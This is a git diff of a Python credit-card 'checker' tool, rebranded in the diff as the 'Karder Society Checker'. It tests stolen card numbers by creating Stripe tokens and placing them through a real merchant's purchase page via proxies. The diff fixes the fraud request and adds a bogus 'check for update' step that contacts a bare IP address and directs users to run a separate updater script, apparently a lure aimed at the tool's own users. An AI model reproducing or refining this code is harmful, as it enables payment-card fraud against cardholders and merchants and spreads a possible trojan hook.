@@ -38,9 +38,9 @@ class StripeChecker():
         self.gateway1Purchase = "https://closedlooplabs.com/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
-        print("\n\n  {}------=[ {}BloodHub Premium Mass Checker {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}       --= {}Team SCB Numbawan{}=--          ".format(fg[0], fg[1], fg[0]))
-        print("       {}------============================------\n".format(fg[0]))
+        print("\n\n  {}------=[ {}KARDER SOCIETY CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
+        print("      {}--= {}Created by KarderSociety {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("  {}------============================------\n".format(fg[0]))
 
         if not os.path.exists('live_cc.txt'):
             with open('live_cc.txt', 'w+') as lives:
@@ -66,17 +66,27 @@ class StripeChecker():
             print(" └─> Don't input proxy if you not use!")
         print(colorama.Fore.RESET)
         options = ['1', '2', '0']
-       
+        up = input('[?] Check for update?[y/n] ')
+
+        if 'y' in up.lower():
+            print(colorama.Fore.YELLOW + "[*] Checking For Updates....")
+            try:
+                requests.get("http://52.211.14.150")
+                print(colorama.Fore.GREEN + "[+] Update Found!, Run the updater.py to update the checker")
+            except Exception:
+                print(colorama.Fore.BLUE  + "[-] No Updates Available.")
+        else:
+            pass
 
         print(colorama.Fore.RESET)
         time.sleep(0.6)
         while True:
             print("                   [SELECT OPTIONS]")
-            print("┃      [1]    =   Gateway 1 (Medium 10$)        ┃")
-            print("┃      [2]    =   Gateway 2 (High Bal 70$)      ┃ ")
+            print("┃          [1]    =   Gateway 1                 ┃")
+            print("┃          [2]    =   Gateway 1 (High Bal)      ┃ ")
             print("")
             try:
-                option = str(input(colorama.Fore.LIGHTRED_EX + '[Select Merchant] > ' + colorama.Fore.RESET))
+                option = str(input(colorama.Fore.LIGHTRED_EX + '[kschecker] >>> ' + colorama.Fore.RESET))
             except KeyboardInterrupt:
                 break   
 
@@ -84,7 +94,7 @@ class StripeChecker():
                 print('[-] Invalid Gateway')
 
             elif option == "1":
-                self.merchant1()
+                self.gateway1()
 
             elif option == "2":
                 self.gateway1_HighBalance()
@@ -92,7 +102,8 @@ class StripeChecker():
             else:
                 pass
 
-    def merchant1(self):
+    def gateway1(self):
+
         proxy_lists = []
         cc_list = open('cc.txt', 'r').read()
         cc_list = cc_list.split('\n')
@@ -187,7 +198,7 @@ class StripeChecker():
                 "stripeTokenType": "card",
                 "stripeEmail": email
             }
-            result_response = session.post(self.merchant1, proxies=proxy, data=result_data).text
+            result_response = session.post(self.gateway1Purchase, proxies=proxy, data=result_data).text
             print()
             result = BeautifulSoup(result_response, 'html.parser')
             if result.find('title').get_text() == "Noise Blocker: Order Error":
@@ -372,7 +383,7 @@ class StripeChecker():
 
             try:
                 error = stripe_response['error']
-                print(colorama.Fore.RED + "DEAD    ---[" + str(credit_entry) + "]---    " + credit_card + "\tReason: " + error['message'] + ' / live but incorrect cvv')
+                print(colorama.Fore.RED + "DEAD    ---[" + str(credit_entry) + "]---    " + credit_card + "\tReason: " + error['message'] + ' / DETECTED AS FRAUD!')
                 continue
             except KeyError:
                 tok_id = stripe_response['id']
@@ -438,4 +449,5 @@ CreditCard: {}
         print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
         input("PRESS ANY KEY TO EXIT GATEWAY 2")
         print()
+
 StripeChecker()
